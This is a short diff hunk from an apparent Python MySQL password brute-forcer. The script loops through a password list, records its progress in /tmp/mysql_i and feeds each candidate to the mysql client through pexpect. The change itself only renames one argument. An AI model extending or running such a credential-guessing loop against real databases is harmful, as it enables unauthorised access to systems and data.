@@ -21,7 +21,7 @@ while i < len(passwords):
     with open("/tmp/mysql_i", "w") as f:
         f.write(str(i))
 
-    process = pexpect.spawn("mysql", ["-u", user, "-p", pass_], encoding="utf-8")
+    process = pexpect.spawn("mysql", ["-u", user, "-p", destino], encoding="utf-8")
 
     process.expect("Enter password:")
     process.sendline(str(passwords[i]))
